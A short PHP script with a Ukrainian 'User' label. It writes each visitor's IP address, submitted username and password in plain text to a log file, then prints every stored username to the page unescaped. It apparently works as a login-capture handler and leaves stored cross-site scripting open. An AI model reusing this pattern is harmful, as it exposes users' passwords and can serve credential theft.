<?php
$myfile = fopen("data.log", "a+") or die("Unable to open file!");
$a =$_SERVER['REMOTE_ADDR']."#".$_POST['username']."#".$_POST['password']."\n";
fwrite($myfile, $a);
$f = file ('data.log');
foreach ($f as $val) {
	$ar = explode("#", $val);
	echo "Користувач ". $ar[1]."<br>";
}
fclose($myfile);
?>